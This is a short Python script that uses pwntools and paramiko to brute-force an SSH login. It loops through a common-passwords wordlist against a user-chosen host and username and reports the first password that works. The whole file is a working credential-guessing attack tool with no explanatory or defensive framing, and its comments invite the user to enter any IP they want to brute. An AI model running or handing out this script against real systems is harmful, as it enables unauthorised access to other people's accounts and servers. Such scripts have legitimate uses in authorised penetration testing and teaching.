from pwn import *
import paramiko

host = "127.0.0.1" #Input IP you want to brute.
username = "notroot" #Input username you want to brute.
attempts = 0 #This counts attempts

with open("ssh-common-passwords.txt", "r") as passwords_list:
	for password in passwords_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting Password: '{}'..".format(attempts, password))
			response = ssh(host=host, user=username, password=password, 
				timeout=1)
			if response.connected():
				print("[>] Valid Password Found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid Password!")
		attempts += 1